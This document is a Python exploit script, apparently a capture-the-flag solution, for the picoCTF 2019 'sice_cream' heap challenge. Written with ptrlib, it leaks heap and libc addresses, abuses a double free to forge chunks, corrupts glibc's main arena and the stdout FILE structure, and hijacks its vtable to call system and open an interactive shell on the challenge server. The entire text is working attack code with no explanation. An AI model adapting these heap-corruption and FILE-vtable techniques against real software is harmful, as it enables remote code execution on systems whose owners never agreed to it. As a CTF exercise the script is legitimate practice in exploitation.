from ptrlib import *

def add(size, data):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("> ", str(size))
    sock.sendafter("> ", data)
    return

def delete(index):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("> ", str(index))
    return

def rename(name):
    sock.sendlineafter("> ", "3")
    sock.sendafter("> ", name)
    sock.recvuntil("like ")
    return sock.recvline()[:-1]

libc = ELF("./libc.so.6")
addr_name = 0x602040
libc_main_arena = 0x3c4b20
libc_one_gadget = [0xf1147, 0xf02a4, 0x4526a][1]

while True:
    #sock = Socket("localhost", 9999)
    sock = Socket("2019shell1.picoctf.com", 5033)
    #sock = Process("./sice_cream", env={'LD_PRELOAD': './libc.so.6'})
    sock.sendafter("> ", "a")

    # heap leak
    add(0x28, 'A') # 0
    heap_base = u64(rename("A" * 0x100)[0x100:])
    logger.info("heap base = " + hex(heap_base))
    if not 0x60 <= (heap_base >> 16) < 0x70:
        sock.close()
        continue

    fake_chunk = p64(0) + p64(0x31)
    fake_chunk += b'\x00' * (0x90 - len(fake_chunk))
    fake_chunk += p64(0) + p64(0x21)
    fake_chunk += b'\x00' * 0x10
    fake_chunk += p64(0) + p64(0x21)
    rename(fake_chunk)

    # libc leak
    add(0x28, 'B') # 1
    delete(0)
    delete(1)
    delete(0)
    add(0x28, p64(addr_name)) # 2
    add(0x28, 'dummy')        # 3
    add(0x28, 'dummy')        # 4
    add(0x28, 'A' * 0x10)     # 5
    add(0x58, 'Hello') # 6
    add(0x58, 'Hello') # 7
    rename(p64(0) + p64(0x91))
    delete(5)
    libc_base = u64(rename("A" * 0x10)[0x10:]) - libc_main_arena - 0x58
    logger.info("libc base = " + hex(libc_base))

    # fix and use up smallbin
    rename(p64(0) + p64(0x91))
    add(0x48, "A") # 8
    add(0x28, "B") # 9
    add(0x38, "B") # 10
    delete(10)

    # corrupt main arena
    delete(6)
    delete(7)
    delete(6)
    add(0x58, p64(libc_base + libc_main_arena + 0x12)) # 11
    add(0x58, 'dummy') # 12
    add(0x58, 'dummy') # 13

    # corrupt _IO_2_1_stdout_
    payload = b'\x00' * 6
    payload += b'\x00' * 0x30
    payload += p64(libc_base + libc.symbol("_IO_2_1_stdout_") - 0x10)
    payload += p64(libc_base + libc_main_arena + 0x58)
    add(0x58, payload) # 14
    add(0x58, p32(0xfbad1800) + b';sh\x00') # 15 == top chunk
    add(0x58, '\x00')

    # corrupt stdout vtable
    fake_file = p64(0) * 2
    fake_file += p64(libc_base + libc.symbol("system")) * 0x10
    rename(fake_file)
    add(0x58, p64(0) * 3 + p64(addr_name))

    # get the shell!
    sock.interactive()
    break
